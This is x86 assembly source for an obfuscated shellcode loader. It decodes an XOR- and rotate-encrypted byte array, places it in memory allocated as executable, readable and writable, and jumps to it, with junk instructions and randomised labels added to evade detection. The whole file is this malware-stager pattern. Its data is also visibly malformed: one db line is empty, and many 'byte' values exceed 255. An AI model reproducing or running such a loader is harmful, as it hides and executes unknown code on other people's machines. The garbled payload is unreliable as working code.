.386
.model flat, stdcall
option casemap:none

include kernel32.inc
includelib kernel32.lib

.data
    ; Encrypted payload (543 bytes)
    payload_9366 db 
        db 0224h,0102h,069h,07h,0106h,066h,02h,0105h,078h,0103h,0238h,0205h,08h,0233h,096h,0233h
        db 0151h,023h,0214h,0212h,0210h,0178h,0242h,0121h,0190h,0158h,062h,0117h,0250h,0219h,0217h,0152h
        db 0135h,037h,0198h,07h,098h,0193h,097h,0128h,0174h,071h,0206h,076h,0234h,067h,0174h,0168h
        db 020h,054h,0148h,0212h,0179h,0177h,088h,0215h,028h,0126h,094h,0220h,0250h,083h,0252h,0152h
        db 070h,0101h,07h,039h,0160h,0194h,098h,0232h,099h,098h,0170h,044h,0138h,035h,0136h,0232h
        db 086h,0117h,023h,055h,0176h,0210h,0114h,057h,0220h,030h,0189h,0188h,0113h,0118h,018h,0240h
        db 014h,0227h,0164h,0196h,0162h,065h,032h,0131h,0174h,07h,044h,05h,0168h,0202h,041h,043h
        db 0180h,0183h,028h,0181h,0211h,0115h,082h,050h,028h,0157h,061h,0252h,0219h,019h,0122h,0155h
        db 068h,0167h,0169h,0175h,043h,0235h,0132h,00h,079h,0237h,0205h,0108h,074h,0227h,0106h,0232h
        db 086h,0255h,0150h,0119h,080h,0179h,0248h,0115h,031h,0247h,0220h,060h,0242h,091h,0251h,089h
        db 0166h,0101h,070h,0229h,0130h,066h,096h,0140h,0164h,06h,0196h,0107h,0168h,0107h,0192h,075h
        db 0215h,0119h,0220h,0183h,080h,0113h,0144h,0217h,092h,062h,0212h,0125h,027h,0187h,0154h,0250h
        db 0164h,037h,0172h,039h,0163h,0130h,0194h,0169h,0110h,0142h,045h,013h,0231h,033h,097h,0161h
        db 0210h,0245h,020h,0149h,048h,019h,0184h,0145h,0127h,0183h,028h,0124h,0218h,0249h,0155h,0187h
        db 04h,039h,04h,0141h,099h,033h,02h,0131h,044h,013h,0132h,0207h,042h,0171h,08h,0170h
        db 0158h,087h,0117h,0215h,0154h,019h,048h,0147h,031h,0126h,0191h,060h,058h,090h,026h,0212h
        db 0204h,0174h,0108h,01h,0227h,0195h,064h,0160h,0102h,0205h,0110h,0101h,0232h,0203h,0201h,0107h
        db 0151h,053h,084h,055h,081h,0123h,0176h,080h,0255h,0223h,030h,048h,055h,0253h,0121h,088h
        db 036h,079h,0132h,0100h,0195h,0227h,072h,033h,0175h,0142h,0206h,0109h,0107h,0138h,042h,065h
        db 052h,0247h,0149h,055h,0115h,0209h,0113h,0147h,0254h,087h,0125h,0156h,0154h,0186h,026h,0248h
        db 06h,0165h,05h,0196h,0227h,043h,0162h,032h,014h,0173h,036h,0236h,0138h,0139h,0168h,075h
        db 062h,0181h,0213h,061h,0114h,0147h,056h,051h,0124h,0222h,0190h,0157h,090h,0185h,0152h,0185h
        db 014h,0165h,0102h,036h,0195h,0227h,077h,0101h,015h,047h,0104h,012h,042h,065h,02h,01h
        db 0127h,031h,048h,0177h,0116h,027h,0121h,025h,025h,0250h,090h,021h,0152h,089h,057h,027h
        db 0103h,071h,077h,0100h,0194h,0192h,064h,0163h,0230h,079h,045h,0141h,0168h,0200h,0234h,0107h
        db 0215h,022h,053h,0253h,016h,0210h,0114h,0240h,0246h,0189h,0220h,060h,0122h,026h,089h,0216h
        db 0133h,0103h,068h,0205h,035h,0129h,064h,097h,0140h,06h,0129h,0128h,014h,0234h,073h,0105h
        db 0222h,0181h,0245h,0150h,0114h,0152h,0216h,0241h,0220h,0221h,0158h,060h,0217h,0250h,0121h,0249h
        db 036h,07h,037h,0134h,0170h,09h,0170h,0171h,0166h,0239h,0143h,047h,010h,0201h,0229h,0205h
        db 0244h,023h,0148h,055h,0147h,082h,0113h,0185h,062h,0159h,062h,029h,0241h,0179h,0242h,0179h
        db 0204h,013h,0201h,0227h,00h,0163h,02h,035h,0236h,0196h,0132h,043h,075h,043h,073h,0233h
        db 0212h,0180h,0150h,023h,050h,019h,0152h,0152h,0127h,0221h,0189h,0125h,0187h,090h,0184h,024h
        db 079h,042h,041h,0204h,0203h,0202h,0104h,0197h,0171h,0235h,0100h,0136h,0174h,099h,0238h,0205h
        db 016h,0241h,0124h,0241h,0151h,023h,0214h,0212h,0218h,0186h,0250h,0117h,0211h,0210h,0209h
    size_721 equ $-payload_9366

    ; Decryption keys
    xor_6783 db 106h
    rol_1105 db 5h

    junk_0 db 241h
    junk_1 db 196h
    junk_2 db 44h
    junk_3 db 130h
    junk_4 db 153h

.code
start:
    nop
    xor eax, eax
    inc eax
    dec eax
    ; Get payload address
    lea esi, payload_9366
    mov ecx, size_721
    mov al, xor_6783
    mov bl, rol_1105
    xor edx, edx        ; Position counter

loop_3300:
    ; Load encrypted byte
    mov ah, [esi]

    push ecx
    pop ecx    ; Junk
    ; XOR with key and position
    xor ah, al
    xor ah, dl

    ; ROR to reverse ROL
    mov cl, bl
    ror ah, cl

    ; Store decrypted byte
    mov [esi], ah

    ; Next byte
    inc esi
    inc edx
    mov ecx, size_721
    cmp edx, ecx
    jl loop_3300

    ; Allocate executable memory
    push 40h               ; PAGE_EXECUTE_READWRITE
    push 1000h             ; MEM_COMMIT
    push size_721
    push 0
    call VirtualAlloc
    test eax, eax
    jz exit_8375

    ; Copy decrypted payload to executable memory
    mov edi, eax           ; Destination (executable memory)
    lea esi, payload_9366    ; Source (decrypted payload)
    mov ecx, size_721
    cld
    rep movsb

    ; Execute payload
    call eax

exit_8375:
    ; Exit process
    push 0
    call ExitProcess

end start
